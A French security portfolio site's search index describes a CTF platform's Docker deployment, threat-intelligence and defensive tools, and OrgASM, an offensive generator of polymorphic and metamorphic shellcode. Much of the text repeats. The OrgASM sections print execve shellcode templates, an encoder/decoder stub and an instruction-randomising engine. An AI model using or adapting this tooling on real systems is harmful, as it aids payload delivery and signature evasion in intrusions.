cons\u00e9cutifs. Exemple Pour passer du level0 au level1, il fallait r\u00e9ussir le challenge de l'utilisateur level0 puis se connecter au suivant gr\u00e2ce au flag obtenu. Deux tracks \u00e9taient disponibles : La track \"d\u00e9butants\" 12 challenges r\u00e9partis en 3 instances La track \"confirm\u00e9s\" 20 challenges r\u00e9partis en 5 instances","title":"ACK&amp;/"},{"location":"ctf/#deploiement-des-instances","text":"L'ensemble des challenges pr\u00e9sents sur l'instance \u00e9taient install\u00e9s et configur\u00e9s lors du d\u00e9ploiement. Exemple de Dockerfile utilis\u00e9 pour d\u00e9ployer une instance FROM ubuntu:20.04 # Setup RUN apt update RUN apt install -y openssh-server vim man less netcat cron zip sl COPY src/root/etc /etc # Allow caching of apt by putting it below # level0 password ARG RNG0 = toor # Challenger's unique session, handled by Chatsubo ARG SESSION # Register all the generated flag passed by Chatsubo via --build-args # ENV is needed to allow entrypoint to access them ARG FLAG0 ARG FLAG1 ARG FLAG2 ARG FLAG3 ENV FLAGS = \" $FLAG0 ; $FLAG1 ; $FLAG2 ; $FLAG3 \" RUN echo $FLAGS RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $RNG0 \" ) level0 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG0 \" ) level1 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG1 \" ) level2 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG2 \" ) level3 RUN useradd -ms /bin/bash -p $( openssl passwd -6 \" $FLAG3 \" ) level4 # Exposed metadata, needed by Chatsubo for dynamic flags, session handling and ssh initial access LABEL chatsubo.template = \"adv_ans01\" \\ chatsubo.creds.ssh.username = \"level0\" \\ chatsubo.creds.ssh.password = \" $RNG0 \" \\ chatsubo.flags.step0.value = \" $FLAG0 \" \\ chatsubo.flags.step0.points = \"250\" \\ chatsubo.flags.step1.value = \" $FLAG1 \" \\ chatsubo.flags.step1.points = \"250\" \\ chatsubo.flags.step2.value = \" $FLAG2 \" \\ chatsubo.flags.step2.points = \"250\" \\ chatsubo.flags.step3.value = \" $FLAG3 \" \\ chatsubo.flags.step3.points = \"250\" \\ chatsubo.session = \" $SESSION \" # Add challenges setup scripts and resources COPY src/root / RUN chmod u+x /home/level**/ans_init.sh # Needed for sshd RUN mkdir /run/sshd RUN echo \" $FLAGS \" > /root/flags COPY src/entrypoint.sh /entrypoint.sh RUN chmod u+x /entrypoint.sh ENTRYPOINT /bin/bash -c '/etc/init.d/cron start && cat /root/flags | /entrypoint.sh' Chaque dossier comprenait un Dockerfile comme celui ci-dessus ainsi que l'ensemble des fichiers \u00e0 copier dans le conteneur. Par exemple : . |-- Dockerfile |-- Makefile `-- src |-- entrypoint.sh `-- root |-- etc | `-- ssh | `-- sshd_config `-- home |-- level0 | |-- ans_init.sh | `-- main.c |-- level1 | |-- ans_init.sh | `-- hexhexhex |-- level2 | |-- ans_init.sh | |-- challenge.py | `-- create_flag.py |-- level3 | |-- ans_init.sh | |-- main.c | `-- patch.py `-- level4 |-- ans_init.sh `-- finish.txt L'entrypoint avait pour seul r\u00f4le d'appeler le script ans_init.sh pr\u00e9sent dans le home de chacun des utilisateurs, en lui transmettant le flag \u00e0 ins\u00e9rer dans le challenge, le nom de l'utilisateur courant ainsi que celui du suivant : #!/bin/bash rm -f $0 SCRIPT_NAME = \"ans_init.sh\" RAW_FLAGS = \" $( cat /root/flags ) \" FLAGS =( ${ RAW_FLAGS //;/ } ) # Start challenge setup script for each levels and remove it for i in { 0 ..4 } ; do current_user = \"level $i \" next_user = \"level $(( $i + 1 )) \" init_script = \"/home/level $i / $SCRIPT_NAME \" current_flag = ${ FLAGS [i] :- \"_\" } [ -f \" $init_script \" ] && bash -c \" $init_script $current_flag $current_user $next_user \" rm -f $init_script done rm -f /root/flags /etc/init.d/cron start # Allow remote access while true ; do /usr/sbin/sshd -e -D done Ce script, ans_init.sh , \u00e9tait \u00e9crit par le cr\u00e9ateur du challenge et s'occupait de mettre en place les diff\u00e9rents \u00e9l\u00e9ments n\u00e9cessaires \u00e0 son fonctionnement : FLAG = $1 CURRENT_USER = $2 NEXT_USER = $3 bin_name = \"hexhexhex\" chown -R \" $CURRENT_USER :\" \"/home/ $CURRENT_USER \" chown \" $NEXT_USER :\" \"/home/ $CURRENT_USER / $bin_name \" chmod u+xs \"/home/ $CURRENT_USER / $bin_name \" echo $FLAG > \"/home/ $NEXT_USER /flag\" chown \" $NEXT_USER :\" \"/home/ $NEXT_USER /flag\" chmod 400 \"/home/ $NEXT_USER /flag\"","title":"D\u00e9ploiement des instances"},{"location":"cti/","text":"CTI # Melody # Info Source : https://github.com/bonjourmalware/melody Inspiration : R\u00e8gles Sigma , viz.greynoise.io Langage : Golang Melody est une sonde de couche 2 permettant d'enregistrer et de tagger l'ensemble des paquets re\u00e7us via un syst\u00e8me de r\u00e8gles sur-mesure. Cet outil est pens\u00e9 pour \u00eatre dispers\u00e9 sur Internet afin d'en capter le \"bruit de fond\". Plusieurs cas d'usages existent : Poss\u00e9der un \"n\u00e9gatif\" du traffic n\u00e9gligeable pour r\u00e9duire le bruit lors d'une analyse d'activit\u00e9 r\u00e9seau Analyser les motifs r\u00e9current pour en extraire des tendances Suivre l'\u00e9volution de la menace lors de la correction d'une vuln\u00e9rabilit\u00e9 critique Surveiller l'\u00e9mergence d'une campagne d'exploitation sur une ou un ensemble de technologies donn\u00e9es Rejouer une capture r\u00e9seau pour en extraire des paquets sp\u00e9cifiques gr\u00e2ce \u00e0 des r\u00e8gles d\u00e9di\u00e9es Un serveur HTTP/S int\u00e9gr\u00e9 offre la possibilit\u00e9 d'\u00e9muler une application web vuln\u00e9rable en pla\u00e7ant simplement les fichiers \u00e0 afficher aux chemins ad\u00e9quats. Cela peut s'av\u00e9rer utile, par exemple, si l'on souhaite observer le comportement des scanners en fonction des applications expos\u00e9es. Pour plus de d\u00e9tails, une documentation est disponible sur https://bonjourmalware.github.io/melody/ . Aper\u00e7u # Aper\u00e7u du flux de paquets re\u00e7us par une sonde Melody Exemple de dashboard qu'il est possible de r\u00e9aliser \u00e0 partir des donn\u00e9es r\u00e9colt\u00e9es Meloctl # Info Source : https://github.com/bonjourmalware/melody (en cours de finalisation avant sa premi\u00e8re release) Langage : Golang Meloctl est un programme destin\u00e9 \u00e0 faciliter l'utilisation de Melody en prenant en charge les op\u00e9rations suivantes : Installation et mise \u00e0 jour de la sonde Int\u00e9gration \u00e0 systemd Int\u00e9gration \u00e0 supervisor Validation du fichier de configuration Cr\u00e9ation de r\u00e8gles depuis la CLI ou de mani\u00e8re interactive Validation des r\u00e8gles fichier par fichier ou par dossier complet Mise \u00e0 jour du ruleset Aper\u00e7u # Aper\u00e7u de la validation des r\u00e8gles Your browser does not support the video tag. Cr\u00e9ation d'un template de r\u00e8gle lab.bonjourmalwa.re # Info Inspiration : viz.greynoise.io Langage : Golang, VueJS Cette interface est disponible publiquement et propose un jeu de donn\u00e9es issu des 30 derniers jours de r\u00e9colte d'une sonde Melody. Elle a \u00e9t\u00e9 cr\u00e9\u00e9e afin d'offrir une interface d'analyse compl\u00e9mentaire \u00e0 Kibana, compl\u00e8tement rigide mais plus rapide et qui permet de pivoter sur l'ensemble des param\u00e8tres r\u00e9colt\u00e9s. De plus, elle me permet d'\u00eatre en mesure de monter des pages synth\u00e9tisant des informations regroup\u00e9es d'une mani\u00e8re qu'il est difficile de reproduire via un moteur de visualisation comme Kibana. Aper\u00e7u # Your browser does not support the video tag.","title":"Threat intelligence"},{"location":"cti/#cti","text":"","title":"CTI"},{"location":"cti/#melody","text":"Info Source : https://github.com/bonjourmalware/melody Inspiration : R\u00e8gles Sigma , viz.greynoise.io Langage : Golang Melody est une sonde de couche 2 permettant d'enregistrer et de tagger l'ensemble des paquets re\u00e7us via un syst\u00e8me de r\u00e8gles sur-mesure. Cet outil est pens\u00e9 pour \u00eatre dispers\u00e9 sur Internet afin d'en capter le \"bruit de fond\". Plusieurs cas d'usages existent : Poss\u00e9der un \"n\u00e9gatif\" du traffic n\u00e9gligeable pour r\u00e9duire le bruit lors d'une analyse d'activit\u00e9 r\u00e9seau Analyser les motifs r\u00e9current pour en extraire des tendances Suivre l'\u00e9volution de la menace lors de la correction d'une vuln\u00e9rabilit\u00e9 critique Surveiller l'\u00e9mergence d'une campagne d'exploitation sur une ou un ensemble de technologies donn\u00e9es Rejouer une capture r\u00e9seau pour en extraire des paquets sp\u00e9cifiques gr\u00e2ce \u00e0 des r\u00e8gles d\u00e9di\u00e9es Un serveur HTTP/S int\u00e9gr\u00e9 offre la possibilit\u00e9 d'\u00e9muler une application web vuln\u00e9rable en pla\u00e7ant simplement les fichiers \u00e0 afficher aux chemins ad\u00e9quats. Cela peut s'av\u00e9rer utile, par exemple, si l'on souhaite observer le comportement des scanners en fonction des applications expos\u00e9es. Pour plus de d\u00e9tails, une documentation est disponible sur https://bonjourmalware.github.io/melody/ .","title":"Melody"},{"location":"cti/#apercu","text":"Aper\u00e7u du flux de paquets re\u00e7us par une sonde Melody Exemple de dashboard qu'il est possible de r\u00e9aliser \u00e0 partir des donn\u00e9es r\u00e9colt\u00e9es","title":"Aper\u00e7u"},{"location":"cti/#meloctl","text":"Info Source : https://github.com/bonjourmalware/melody (en cours de finalisation avant sa premi\u00e8re release) Langage : Golang Meloctl est un programme destin\u00e9 \u00e0 faciliter l'utilisation de Melody en prenant en charge les op\u00e9rations suivantes : Installation et mise \u00e0 jour de la sonde Int\u00e9gration \u00e0 systemd Int\u00e9gration \u00e0 supervisor Validation du fichier de configuration Cr\u00e9ation de r\u00e8gles depuis la CLI ou de mani\u00e8re interactive Validation des r\u00e8gles fichier par fichier ou par dossier complet Mise \u00e0 jour du ruleset","title":"Meloctl"},{"location":"cti/#apercu_1","text":"Aper\u00e7u de la validation des r\u00e8gles Your browser does not support the video tag. Cr\u00e9ation d'un template de r\u00e8gle","title":"Aper\u00e7u"},{"location":"cti/#labbonjourmalware","text":"Info Inspiration : viz.greynoise.io Langage : Golang, VueJS Cette interface est disponible publiquement et propose un jeu de donn\u00e9es issu des 30 derniers jours de r\u00e9colte d'une sonde Melody. Elle a \u00e9t\u00e9 cr\u00e9\u00e9e afin d'offrir une interface d'analyse compl\u00e9mentaire \u00e0 Kibana, compl\u00e8tement rigide mais plus rapide et qui permet de pivoter sur l'ensemble des param\u00e8tres r\u00e9colt\u00e9s. De plus, elle me permet d'\u00eatre en mesure de monter des pages synth\u00e9tisant des informations regroup\u00e9es d'une mani\u00e8re qu'il est difficile de reproduire via un moteur de visualisation comme Kibana.","title":"lab.bonjourmalwa.re"},{"location":"cti/#apercu_2","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"defsec/","text":"S\u00e9curit\u00e9 d\u00e9fensive # NoMoreDuck # Info Source : https://gitlab.com/Alvoras/nomoreduck Inspiration : https://github.com/pmsosa/duckhunt Langage : Golang Description # NoMoreDuck (dont le nom est inspir\u00e9 de l'admirable projet NoMoreRansom ) propose une contre-mesure aux injections de commande par l'interm\u00e9diaire d'un \u00e9mulateur HID comme le RubberDucky. Fonctionnement # L'outil va calculer le d\u00e9lai moyen entre chaque frappe et d\u00e9clencher l'une des actions suivantes lorsque le seuil configur\u00e9 est d\u00e9pass\u00e9 : Paranoid La session est verouill\u00e9e Normal L'envoi de nouvelles frappes est bloqu\u00e9 pendant X secondes Sneaky Une touche sur X est bloqu\u00e9e Log Invisible pour l'attaquant Un fichier est cr\u00e9\u00e9 contenant toutes les frappes de clavier jusqu'\u00e0 la lev\u00e9e de l'alerte La fr\u00e9quence et la dur\u00e9e de ces contre-mesures sont param\u00e9trables via le fichier de configuration. Aper\u00e7u # Your browser does not support the video tag.","title":"S\u00e9curit\u00e9 d\u00e9fensive"},{"location":"defsec/#securite-defensive","text":"","title":"S\u00e9curit\u00e9 d\u00e9fensive"},{"location":"defsec/#nomoreduck","text":"Info Source : https://gitlab.com/Alvoras/nomoreduck Inspiration : https://github.com/pmsosa/duckhunt Langage : Golang","title":"NoMoreDuck"},{"location":"defsec/#description","text":"NoMoreDuck (dont le nom est inspir\u00e9 de l'admirable projet NoMoreRansom ) propose une contre-mesure aux injections de commande par l'interm\u00e9diaire d'un \u00e9mulateur HID comme le RubberDucky.","title":"Description"},{"location":"defsec/#fonctionnement","text":"L'outil va calculer le d\u00e9lai moyen entre chaque frappe et d\u00e9clencher l'une des actions suivantes lorsque le seuil configur\u00e9 est d\u00e9pass\u00e9 : Paranoid La session est verouill\u00e9e Normal L'envoi de nouvelles frappes est bloqu\u00e9 pendant X secondes Sneaky Une touche sur X est bloqu\u00e9e Log Invisible pour l'attaquant Un fichier est cr\u00e9\u00e9 contenant toutes les frappes de clavier jusqu'\u00e0 la lev\u00e9e de l'alerte La fr\u00e9quence et la dur\u00e9e de ces contre-mesures sont param\u00e9trables via le fichier de configuration.","title":"Fonctionnement"},{"location":"defsec/#apercu","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"offsec/","text":"S\u00e9curit\u00e9 offensive # OrgASM # Info Source : https://gitlab.com/Alvoras/orgasm Langage : Python, C, NASM Description # OrgASM est un outil en ligne de commande interactif qui permet de g\u00e9n\u00e9rer des shellcodes poly- et metamorphique. Il propose \u00e9galement une gamme d'outils facilitant le d\u00e9veloppement, le test et le d\u00e9bug de shellcode. Note Le plugin de payload supporte \u00e0 la fois le code source NASM et les shellcode sous leurs formes hexad\u00e9cimale. En revanche, le moteur en charge du m\u00e9tamorphisme ne supporte que la premi\u00e8re forme. Aper\u00e7u # Your browser does not support the video tag. Fonctionnement # La fondation du fonctionnement de cet outil est le d\u00e9coupage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de mani\u00e8re ind\u00e9pendante. Nous retrouvons ainsi un syst\u00e8me de plugin diff\u00e9rent pour : Le payload La donn\u00e9es \u00e0 ins\u00e9rer dynamiquement Le polymorphisme Le metamorphisme Payload # La cr\u00e9ation d'un plugin de payload se r\u00e9sume \u00e0 renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de m\u00e9tamorphismes utilis\u00e9s. from modules.payload.base import BasePayload from modules.patcher.ascii_data import AsciiData from modules.patcher.ascii_len import AsciiLen from modules.meta.metaengine import MetaEngine from modules.meta.junk import Junk from modules.meta.zero import Zero class ExecvePayload ( BasePayload ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Execve\" # Add the patcher's options to the payload # Here the AsciiData adds the \"data\" option self . options . add_patcher_options ( AsciiData ) self . add_patcher ( AsciiData ) def payload_32 ( self ): # Register the metmorphic plugins used meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: ; Pick a random alterations and patch it on the fly { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } push eax ; Insert the placeholder that will be replaced by the value of the \"data\" option { AsciiData . token } ; Add some random junk { meta . apply ( 'junk' , 32 ) } mov ebx,esp mov ecx,eax mov edx,eax mov al, 0x0b mov ebx, esp int 0x80 { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } inc eax int 0x80 \"\"\" # The same goes for the x64 template def payload_64 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: { meta . apply ( 'zero' , 64 , reg1 = 'eax' ) } push 0x42 pop rax inc ah cqo push rdx { AsciiData . token } { meta . apply ( 'junk' , 64 ) } push rsp pop rsi mov r8, rdx mov r10, rdx syscall \"\"\" Donn\u00e9es dynamiques # Les donn\u00e9es \u00e0 int\u00e9grer au shellcode de mani\u00e8re dynamique sont g\u00e9r\u00e9es par les patchers . Leur fonctionnement est simple : leur seul r\u00f4le est renvoyer la donn\u00e9e par laquelle remplacer le placeholder pr\u00e9sent dans le template. from modules.patcher.base import BasePatcher class AsciiLen ( BasePatcher ): # Template placeholder token = \"$ASCII_LEN$\" # \"patch_shellcode\" is set upstream to signal # that we're patching either raw shellcode or NASM source code def __init__ ( self , sc , patch_shellcode ): super () . __init__ ( sc , patch_shellcode ) def apply ( self , options , encoded_payload ): data = format ( len ( options . get ( \"data\" )), \"02x\" ) # ex : 1a # We need to add an \"h\" to the end of the hex string if we're # patching a source code template # ie. 08h return self . patch_with ( data ) if self . patch_shellcode else self . patch_with ( f \" { data } h\" ) Polymorphisme # Le polymorphisme est pris en charge par les encoders . Analogues aux payloads, il est \u00e9galement possible d'int\u00e9grer des instructions m\u00e9tamorphiques au sein du template. Apr\u00e8s avoir \u00e9t\u00e9 encod\u00e9 via la fonction encode_byte , le payload est plac\u00e9 \u00e0 la suite du d\u00e9codeur. from modules.encoder.base import BaseEncoder from modules.meta.metaengine import MetaEngine from modules.meta.zero import Zero from modules.meta.junk import Junk from modules.patcher.shellcode_len import ShellcodeLen from modules.patcher.offset import Offset class CaesarMetaEncoder ( BaseEncoder ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Caesar metamorphic\" self . options . add_patcher_options ( Offset ) self . add_patcher ( Offset ) self . add_patcher ( ShellcodeLen ) def decoder_32 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return rf \"\"\" section .text global _start: _start: jmp one { meta . apply ( 'junk' , 32 ) } four: pop esi { meta . apply ( 'zero' , 32 , reg1 = 'ecx' ) } mov cl, { ShellcodeLen . token } two: sub BYTE [esi+ecx-1], { Offset . token } sub cl,1 jne two jmp three one: call four three: \"\"\" def decoder_64 ( self ): return rf \"\"\" section .text global _start: _start: jmp one four: pop rsi xor rcx, rcx mov cl, { ShellcodeLen . token } two: sub BYTE [rsi+rcx-1], { Offset . token } sub cl,0x1 jne two jmp three one: call four three: \"\"\" def encode_byte ( self , op ): encoded = format ( op + self . options . get ( \"offset\" ) % 26 , \"02x\" ) encoded_hex = int ( encoded [ - 2 :], 16 ) return encoded_hex def decode_byte ( self , op ): decoded = format ( op - self . options . get ( \"offset\" ) % 26 , \"02x\" ) decoded_hex = int ( decoded [ - 2 :], 16 ) return decoded_hex Les fonctions d'encodage et de d\u00e9codage peuvent \u00e9galement \u00eatre utilis\u00e9es depuis l'interface sur un shellcode brute : Your browser does not support the video tag. Metamorphisme # Les plugins servant \u00e0 impl\u00e9menter le metamorphisme se r\u00e9sument \u00e0 un nom et aux templates des alt\u00e9rations possibles : from modules.meta.base import BasePlugin class Zero ( BasePlugin ): def __init__ ( self ): super () . __init__ () self . name = \"zero\" self . alterations = { \"32\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ], \"64\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ] } Le moteur de m\u00e9tamorphisme, quant \u00e0 lui, se contente de tenir la liste des plugins enregistr\u00e9s et de les appeler en passant les valeurs depuis le template : import re import random from lib.exception import MarkerNotFound class MetaEngine : def __init__ ( self ): self . name = \"base\" self . alterations = {} self . plugins = {} def add ( self , plugin ): eng = plugin () self . plugins [ eng . name ] = eng def apply ( self , name , arch , ** kwargs ): if not ( plugin := self . plugins . get ( name )): print ( f \"Metamorphic plugin not found \\\" { name } \\\" \" ) return \"\" return plugin . get_random_alt ( arch , reg1 = kwargs . get ( \"reg1\" ), reg2 = kwargs . get ( \"reg2\" ), val1 = kwargs . get ( \"val1\" ), val2 = kwargs . get ( \"val2\" ), val3 = kwargs . get ( \"val3\" ), val4 = kwargs . get ( \"val4\" ) ) La fonction get_random_alt du plugin prend ensuite le relais et s'occupe de g\u00e9n\u00e9rer la ou les instructions \u00e0 partir du template re\u00e7u : import random from lib.exception import UnsupportedArch class BasePlugin : def __init__ ( self ): self . alterations = {} def get_random_alt ( self , arch , reg1 = \"\" , reg2 = \"\" , val1 = \"\" , val2 = \"\" , val3 = \"\" , val4 = \"\" ): alterations = self . alterations . get ( str ( arch )) if not alterations : raise UnsupportedArch rng = random . randint ( 0 , len ( alterations ) - 1 ) alt = alterations [ rng ] for idx , line in enumerate ( alt ): line = line . replace ( \"<reg1>\" , str ( reg1 )) line = line . replace ( \"<reg2>\" , str ( reg2 )) line = line . replace ( \"<val1>\" , str ( val1 )) line = line . replace ( \"<val2>\" , str ( val2 )) line = line . replace ( \"<val2>\" , str ( val3 )) line = line . replace ( \"<val2>\" , str ( val4 )) alt [ idx ] = line return \" \\n \" . join ( alt ) Ces alt\u00e9rations sont choisies al\u00e9atoirement \u00e0 chaque fois que le shellcode est g\u00e9n\u00e9r\u00e9. Il est possible, gr\u00e2ce \u00e0 l'option no_badchars , de recommencer la g\u00e9n\u00e9ration jusqu'\u00e0 ne plus d\u00e9tect\u00e9 de de badchars pr\u00e9sent (dans la limite de la valeur d\u00e9finie via l'option badchars_max_loop ). Confort # Pour am\u00e9liorer le confort lors de la cr\u00e9ation, de l'utilisation et du test de shellcode, OrgASM propose une vue d\u00e9taill\u00e9e reprenant un certain nombre d'informations pouvant s'av\u00e9rer \u00eatre utiles, telles que : La taille du shellcode Les badchars potentiellement pr\u00e9sents La liste class\u00e9e par ordre alphab\u00e9tique des octets qui le composent, sans doublons Les hashs MD5, SHA1 et SHA256 Lorsque l'option verbose est activ\u00e9e, le programme d\u00e9taille les processus de compilation et d'ex\u00e9cution pour permettre de les reproduire dans un autre contexte.","title":"S\u00e9curit\u00e9 offensive"},{"location":"offsec/#securite-offensive","text":"","title":"S\u00e9curit\u00e9 offensive"},{"location":"offsec/#orgasm","text":"Info Source : https://gitlab.com/Alvoras/orgasm Langage : Python, C, NASM","title":"OrgASM"},{"location":"offsec/#description","text":"OrgASM est un outil en ligne de commande interactif qui permet de g\u00e9n\u00e9rer des shellcodes poly- et metamorphique. Il propose \u00e9galement une gamme d'outils facilitant le d\u00e9veloppement, le test et le d\u00e9bug de shellcode. Note Le plugin de payload supporte \u00e0 la fois le code source NASM et les shellcode sous leurs formes hexad\u00e9cimale. En revanche, le moteur en charge du m\u00e9tamorphisme ne supporte que la premi\u00e8re forme.","title":"Description"},{"location":"offsec/#apercu","text":"Your browser does not support the video tag.","title":"Aper\u00e7u"},{"location":"offsec/#fonctionnement","text":"La fondation du fonctionnement de cet outil est le d\u00e9coupage de ce qui constitue un shellcode en briques qu'il est possible manipuler et de combiner de mani\u00e8re ind\u00e9pendante. Nous retrouvons ainsi un syst\u00e8me de plugin diff\u00e9rent pour : Le payload La donn\u00e9es \u00e0 ins\u00e9rer dynamiquement Le polymorphisme Le metamorphisme","title":"Fonctionnement"},{"location":"offsec/#payload","text":"La cr\u00e9ation d'un plugin de payload se r\u00e9sume \u00e0 renseigner un template pour chaque architecture puis enregistrer les patchers et les modules de m\u00e9tamorphismes utilis\u00e9s. from modules.payload.base import BasePayload from modules.patcher.ascii_data import AsciiData from modules.patcher.ascii_len import AsciiLen from modules.meta.metaengine import MetaEngine from modules.meta.junk import Junk from modules.meta.zero import Zero class ExecvePayload ( BasePayload ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Execve\" # Add the patcher's options to the payload # Here the AsciiData adds the \"data\" option self . options . add_patcher_options ( AsciiData ) self . add_patcher ( AsciiData ) def payload_32 ( self ): # Register the metmorphic plugins used meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: ; Pick a random alterations and patch it on the fly { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } push eax ; Insert the placeholder that will be replaced by the value of the \"data\" option { AsciiData . token } ; Add some random junk { meta . apply ( 'junk' , 32 ) } mov ebx,esp mov ecx,eax mov edx,eax mov al, 0x0b mov ebx, esp int 0x80 { meta . apply ( 'zero' , 32 , reg1 = 'eax' ) } inc eax int 0x80 \"\"\" # The same goes for the x64 template def payload_64 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return fr \"\"\" global _start: _start: { meta . apply ( 'zero' , 64 , reg1 = 'eax' ) } push 0x42 pop rax inc ah cqo push rdx { AsciiData . token } { meta . apply ( 'junk' , 64 ) } push rsp pop rsi mov r8, rdx mov r10, rdx syscall \"\"\"","title":"Payload"},{"location":"offsec/#donnees-dynamiques","text":"Les donn\u00e9es \u00e0 int\u00e9grer au shellcode de mani\u00e8re dynamique sont g\u00e9r\u00e9es par les patchers . Leur fonctionnement est simple : leur seul r\u00f4le est renvoyer la donn\u00e9e par laquelle remplacer le placeholder pr\u00e9sent dans le template. from modules.patcher.base import BasePatcher class AsciiLen ( BasePatcher ): # Template placeholder token = \"$ASCII_LEN$\" # \"patch_shellcode\" is set upstream to signal # that we're patching either raw shellcode or NASM source code def __init__ ( self , sc , patch_shellcode ): super () . __init__ ( sc , patch_shellcode ) def apply ( self , options , encoded_payload ): data = format ( len ( options . get ( \"data\" )), \"02x\" ) # ex : 1a # We need to add an \"h\" to the end of the hex string if we're # patching a source code template # ie. 08h return self . patch_with ( data ) if self . patch_shellcode else self . patch_with ( f \" { data } h\" )","title":"Donn\u00e9es dynamiques"},{"location":"offsec/#polymorphisme","text":"Le polymorphisme est pris en charge par les encoders . Analogues aux payloads, il est \u00e9galement possible d'int\u00e9grer des instructions m\u00e9tamorphiques au sein du template. Apr\u00e8s avoir \u00e9t\u00e9 encod\u00e9 via la fonction encode_byte , le payload est plac\u00e9 \u00e0 la suite du d\u00e9codeur. from modules.encoder.base import BaseEncoder from modules.meta.metaengine import MetaEngine from modules.meta.zero import Zero from modules.meta.junk import Junk from modules.patcher.shellcode_len import ShellcodeLen from modules.patcher.offset import Offset class CaesarMetaEncoder ( BaseEncoder ): def __init__ ( self , state ): super () . __init__ ( state ) self . name = \"Caesar metamorphic\" self . options . add_patcher_options ( Offset ) self . add_patcher ( Offset ) self . add_patcher ( ShellcodeLen ) def decoder_32 ( self ): meta = MetaEngine () meta . add ( Junk ) meta . add ( Zero ) return rf \"\"\" section .text global _start: _start: jmp one { meta . apply ( 'junk' , 32 ) } four: pop esi { meta . apply ( 'zero' , 32 , reg1 = 'ecx' ) } mov cl, { ShellcodeLen . token } two: sub BYTE [esi+ecx-1], { Offset . token } sub cl,1 jne two jmp three one: call four three: \"\"\" def decoder_64 ( self ): return rf \"\"\" section .text global _start: _start: jmp one four: pop rsi xor rcx, rcx mov cl, { ShellcodeLen . token } two: sub BYTE [rsi+rcx-1], { Offset . token } sub cl,0x1 jne two jmp three one: call four three: \"\"\" def encode_byte ( self , op ): encoded = format ( op + self . options . get ( \"offset\" ) % 26 , \"02x\" ) encoded_hex = int ( encoded [ - 2 :], 16 ) return encoded_hex def decode_byte ( self , op ): decoded = format ( op - self . options . get ( \"offset\" ) % 26 , \"02x\" ) decoded_hex = int ( decoded [ - 2 :], 16 ) return decoded_hex Les fonctions d'encodage et de d\u00e9codage peuvent \u00e9galement \u00eatre utilis\u00e9es depuis l'interface sur un shellcode brute : Your browser does not support the video tag.","title":"Polymorphisme"},{"location":"offsec/#metamorphisme","text":"Les plugins servant \u00e0 impl\u00e9menter le metamorphisme se r\u00e9sument \u00e0 un nom et aux templates des alt\u00e9rations possibles : from modules.meta.base import BasePlugin class Zero ( BasePlugin ): def __init__ ( self ): super () . __init__ () self . name = \"zero\" self . alterations = { \"32\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ], \"64\" : [ [ f \"xor <reg1>, <reg1>\" ], [ f \"mov <reg1>, 0\" ], [ f \"sub <reg1>, <reg1>\" ], ] } Le moteur de m\u00e9tamorphisme, quant \u00e0 lui, se contente de tenir la liste des plugins enregistr\u00e9s et de les appeler en passant les valeurs depuis le template : import re import random from lib.exception import MarkerNotFound class MetaEngine : def __init__ ( self ): self . name = \"base\" self . alterations = {} self . plugins = {} def add ( self , plugin ): eng = plugin () self . plugins [ eng . name ] = eng def apply ( self , name , arch , ** kwargs ): if not ( plugin := self . plugins . get ( name )): print ( f \"Metamorphic plugin not found \\\" { name } \\\" \" ) return \"\" return plugin . get_random_alt ( arch , reg1 = kwargs . get ( \"reg1\" ), reg2 = kwargs . get ( \"reg2\" ), val1 = kwargs . get ( \"val1\" ), val2 = kwargs . get ( \"val2\" ), val3 = kwargs . get ( \"val3\" ), val4 = kwargs . get ( \"val4\" ) ) La fonction get_random_alt du plugin prend ensuite le relais et s'occupe de g\u00e9n\u00e9rer la ou les instructions \u00e0 partir du template re\u00e7u : import random from lib.exception import UnsupportedArch class BasePlugin : def __init__ ( self ): self . alterations = {} def get_random_alt ( self , arch , reg1 = \"\" , reg2 = \"\" , val1 = \"\" , val2 = \"\" , val3 = \"\" , val4 = \"\" ): alterations = self . alterations . get ( str ( arch )) if not alterations : raise UnsupportedArch rng = random . randint ( 0 , len ( alterations ) - 1 ) alt = alterations [ rng ] for idx , line in enumerate ( alt ): line = line . replace ( \"<reg1>\" , str ( reg1 )) line = line . replace ( \"<reg2>\" , str ( reg2 )) line = line . replace ( \"<val1>\" , str ( val1 )) line = line . replace ( \"<val2>\" , str ( val2 )) line = line . replace ( \"<val2>\" , str ( val3 )) line = line . replace ( \"<val2>\" , str ( val4 )) alt [ idx ] = line return \" \\n \" . join ( alt ) Ces alt\u00e9rations sont choisies al\u00e9atoirement \u00e0 chaque fois que le shellcode est g\u00e9n\u00e9r\u00e9. Il est possible, gr\u00e2ce \u00e0 l'option no_badchars , de recommencer la g\u00e9n\u00e9ration jusqu'\u00e0 ne plus d\u00e9tect\u00e9 de de badchars pr\u00e9sent (dans la limite de la valeur d\u00e9finie via l'option badchars_max_loop ).","title":"Metamorphisme"},{"location":"offsec/#confort","text":"Pour am\u00e9liorer le confort lors de la cr\u00e9ation, de l'utilisation et du test de shellcode, OrgASM propose une vue d\u00e9taill\u00e9e reprenant un certain nombre d'informations pouvant s'av\u00e9rer \u00eatre utiles, telles que : La taille du shellcode Les badchars potentiellement pr\u00e9sents 